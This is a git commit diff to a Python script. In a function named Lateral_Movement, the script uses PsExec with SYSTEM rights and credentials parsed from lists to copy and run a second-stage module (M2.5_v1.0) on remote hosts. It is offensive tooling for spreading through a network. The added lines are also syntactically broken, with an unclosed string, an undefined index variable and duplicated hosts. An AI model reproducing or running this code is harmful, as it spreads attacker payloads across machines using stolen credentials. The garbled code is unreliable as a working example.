feb8040869e8232f7a7cd05a20214b9dc4e2da74
kdw9805 <35162059+kdw9805@users.noreply.github.com>
2022-10-31 23:52:31 +0900

    Update M2_v1.0.py

--- M2_v1.0.py
+++ M2_v1.0.py
@@ -220,7 +220,9 @@ def Lateral_Movement():
         for i in range(len(lists)):
             lines = line[0].split(".")
             if name1 in lists[i]:
-                return_code = os.system('start cmd /k C:\module2\DownloadFile-main\PsExec.exe -s \\\\' + list[i+1] + ' -u ' + lines[1] + '\\' + lines[0] + ' -p ' + lines[3] + ' -cf C:\module2\DownloadFile-main\M2.5_v1.0.exe')
+                return_code = os.system('start cmd /k C:\module2.5\DownloadFile-main\PsExec.exe -s \\' + list[j+1] + ',\\' + list[j+2] + ',\\' + list[j+3] + ' -u ' + lines[1] + '\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2.5\DownloadFile-main\M2.5_v1.0.py')
+                return_code = os.system('start cmd /k C:\module2.5\DownloadFile-main\PsExec.exe -s \\' + list[j+2] + ',\\' + list[j+2] + ',\\' + list[j+3] + ' -u ' + lines[1] + '\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2.5\DownloadFile-main\M2.5_v1.0.py')
+                return_code = os.system('start cmd /k C:\module2.5\DownloadFile-main\PsExec.exe -s \\' + list[j+3] + ',\\' + list[j+2] + ',\\' + list[j+3] + ' -u ' + lines[1] + '\' + lines[0] + ' -p ' + lines[3] + '-c C:\module2.5\DownloadFile-main\M2.5_v1.0.py')
         f.close()
         f1.close()
         '''
